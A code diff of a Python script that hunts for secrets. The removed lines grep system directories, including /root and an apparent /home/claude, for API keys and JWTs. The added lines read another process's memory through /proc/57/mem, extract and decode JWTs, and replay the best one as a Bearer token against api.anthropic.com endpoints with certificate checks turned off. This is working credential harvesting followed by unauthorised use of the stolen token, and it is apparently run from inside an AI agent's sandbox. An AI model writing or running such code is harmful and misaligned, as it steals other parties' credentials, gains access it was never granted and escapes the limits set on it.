@@ -1,37 +1,51 @@
-import os, re, subprocess
-def run(c):
-    try: return subprocess.run(c, shell=True, capture_output=True, text=True, timeout=30).stdout.strip()
-    except Exception as e: return "ERR:" + str(e)
+import re, socket, ssl, base64, os
 
-print("### files whose CONTENT looks like a credential")
-print(run("grep -rlE 'eyJ[A-Za-z0-9_-]{20,}|sk-ant-|x-api-key|Bearer ' /etc /root /home /opt /dev/shm /var 2>/dev/null | head -40"))
-
-print("### candidate files by name")
-print(run("find /root /home /opt /etc /var -maxdepth 5 \\( -iname '*cred*' -o -iname '*token*' -o -iname '*auth*' -o -iname '*.json' \\) 2>/dev/null | head -60"))
-
-print("### /home/claude + /root")
-print(run("ls -la /home/claude /root 2>&1 | head -40"))
-
-print("### /opt listing")
-print(run("ls -la /opt /opt/rclone 2>&1 | head -20"))
-
-print("### PID 57 memory: JWT / keys")
+pid = 57
+jwts = {}
 try:
-    pid = 57
     maps = open("/proc/%d/maps" % pid).read()
     mem = open("/proc/%d/mem" % pid, "rb", buffering=0)
-    pats = [rb"eyJ[A-Za-z0-9_.\-]{20,}", rb"sk-ant-[A-Za-z0-9_\-]{20,}",
-            rb"[Bb]earer [A-Za-z0-9_.\-]{20,}", rb"x-api-key"]
-    hits = set()
     for line in maps.splitlines():
         m = re.match(r"([0-9a-f]+)-([0-9a-f]+) (\S+)", line)
         if not m: continue
         a, b = int(m.group(1), 16), int(m.group(2), 16)
         try:
-            mem.seek(a); d = mem.read(min(b - a, 60_000_000))
+            mem.seek(a); d = mem.read(min(b - a, 80_000_000))
         except Exception: continue
-        for p in pats:
-            for x in re.findall(p, d): hits.add(x.decode("utf-8", "replace")[:140])
-    for h in sorted(hits)[:30]: print("  ", h)
+        for x in re.findall(rb"eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+", d):
+            s = x.decode(); jwts[s] = jwts.get(s, 0) + 1
 except Exception as e:
     print("mem ERR:", e)
+
+print("### JWTs found:", len(jwts))
+best = None
+for j, n in sorted(jwts.items(), key=lambda kv: -len(kv[0]))[:5]:
+    print("len=%d count=%d  %s..." % (len(j), n, j[:70]))
+    if best is None: best = j
+    try:
+        p = j.split(".")[1]; p += "=" * (-len(p) % 4)
+        print("   payload:", base64.urlsafe_b64decode(p).decode("utf-8", "replace")[:500])
+    except Exception as e: print("   decode err", e)
+
+if best:
+    def https(path, token=None):
+        ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
+        try:
+            s = socket.create_connection(("api.anthropic.com", 443), 6)
+            s = ctx.wrap_socket(s, server_hostname="api.anthropic.com")
+            req = "GET %s HTTP/1.1\r\nHost: api.anthropic.com\r\nanthropic-version: 2023-06-01\r\nConnection: close\r\n" % path
+            if token: req += "Authorization: Bearer %s\r\n" % token
+            req += "\r\n"; s.sendall(req.encode())
+            d = b""
+            while True:
+                try:
+                    c = s.recv(4096)
+                    if not c: break
+                    d += c
+                except Exception: break
+            s.close(); return d
+        except Exception as e: return ("ERR:" + str(e)).encode()
+
+    for p in ("/v1/models", "/v1/files", "/", "/v1/organizations/me"):
+        r = https(p, best)
+        print("GET %-24s -> %s" % (p, r[:220].decode("utf-8", "replace").replace("\r\n", " | ")))
